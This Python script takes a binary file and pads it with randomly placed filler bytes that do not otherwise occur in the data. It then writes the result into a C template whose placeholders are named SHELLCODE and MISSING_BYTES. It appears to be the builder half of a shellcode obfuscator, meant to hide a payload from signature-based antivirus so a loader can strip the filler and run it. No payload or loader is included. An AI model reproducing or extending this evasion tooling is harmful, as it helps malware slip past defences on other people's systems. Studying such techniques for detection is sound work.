import os
import sys
import random

def file_to_bytearray(filename):
    try:
        with open(filename, 'rb') as file:
            # Read the entire file
            file_content = file.read()
            return bytearray(file_content)
    except IOError as e:
        print("[!] I/O error({0}): {1}".format(e.errno, e.strerror))
        raise

def get_hex_string(data):
    result = ''

    for i in range(0, len(data), 16):
        result += "\t"
        chunk = data[i:i+16]
        for byte in chunk:
            result += f"0x{byte:02x}, "
        result += "\n"

    return result[1:-3]

def fill_template(padded_data, missing_b, original_data_size, missing_b_size):
    try:
        # Read the content of the input file
        with open("template.c", 'r') as file:
            content = file.read()

        # Replace the strings
        modified_content = content.replace("{{SHELLCODE}}", padded_data).replace("{{MISSING_BYTES}}", missing_b).replace("{{SHELLCODE_SIZE}}", original_data_size).replace("{{MISSBYTES_SIZE}}", missing_b_size)

        # Write the modified content to the output file
        with open("main.c", 'w') as file:
            file.write(modified_content)

        print("[i] Template filled successfully.")
    
    except IOError as e:
        print("[!] I/O error({0}): {1}".format(e.errno, e.strerror))

def fill_missing_byte(data, missing_bytes):
    # Add the missing bytes to the original data in random positions random number of times between 200 and 500
    for _ in range(random.randint(200, 500)):
        data.insert(random.randint(0, len(data)), random.choice(missing_bytes))

    return data

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("[i] Usage: python script.py <file_path>")
        sys.exit(1)
    
    filename = sys.argv[1]
    if os.path.isfile(filename):
        original_data = file_to_bytearray(filename)

        # Number of bytes in the original data
        original_data_size = len(original_data)

        # Get the hex values that aren't present in the original data
        missing_bytes = [byte for byte in range(256) if byte not in original_data]

        # Number of bytes in the original data
        missing_bytes_size = len(missing_bytes)

        # Add the missing bytes to the original data in random positions random number of times
        filled_data = fill_missing_byte(original_data, missing_bytes)

        # Fill template
        fill_template(get_hex_string(filled_data), get_hex_string(missing_bytes), str(original_data_size), str(missing_bytes_size))

    else:
        print("[!] File not found or invalid path:", filename)
